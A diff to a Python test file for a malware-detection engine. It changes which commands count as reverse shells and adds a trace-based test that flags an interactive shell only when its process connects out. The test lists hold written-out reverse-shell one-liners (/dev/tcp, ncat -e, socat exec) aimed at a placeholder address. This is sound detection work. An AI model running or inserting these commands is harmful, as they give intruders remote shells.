@@ -414,11 +414,22 @@ def test_test_certificate_is_copied_never_mounted_through_a_link(tmp_path):
 # ---- found by running real npm MCP malware (v0.4.1) ---------------------------------------
 def test_reverse_shell_pattern():
     from engine import rules
-    for bad in ("sh -c sh -i >& /dev/tcp/203.0.113.7/2333 0>&1", "bash -i", "ncat 203.0.113.7 9 -e /bin/sh",
+    for bad in ("sh -c sh -i >& /dev/tcp/203.0.113.7/2333 0>&1", "ncat 203.0.113.7 9 -e /bin/sh",
                 "socat tcp:203.0.113.7:9 exec:sh", "python -c 'import pty; pty.spawn(\"sh\")'"):
         assert rules.reverse_shell_hits([bad]), bad
-    for fine in ("sh -c npm run build", "node index.js --interactive", "bash -c 'echo hi'", "ls /dev/null"):
+    # An interactive shell alone is what an honest terminal tool starts.
+    for fine in ("sh -c npm run build", "node index.js --interactive", "bash -c 'echo hi'", "ls /dev/null", "bash -i"):
         assert not rules.reverse_shell_hits([fine]), fine
+
+
+def test_interactive_shell_counts_only_when_its_process_connects_out():
+    from engine import rules
+    shell = {"call": "execve", "ok": True, "proc": 9, "argv": ["bash", "-i"]}
+    assert not rules.trace_reverse_shells([shell])
+    dns = {"call": "connect", "ok": True, "proc": 9, "ip": "127.0.0.1", "port": 53}
+    assert not rules.trace_reverse_shells([shell, dns])
+    out = {"call": "connect", "ok": True, "proc": 9, "ip": "203.0.113.7", "port": 2333}
+    assert rules.trace_reverse_shells([shell, out]) == ["bash -i"]
 
 
 def test_install_script_reverse_shell_is_critical():
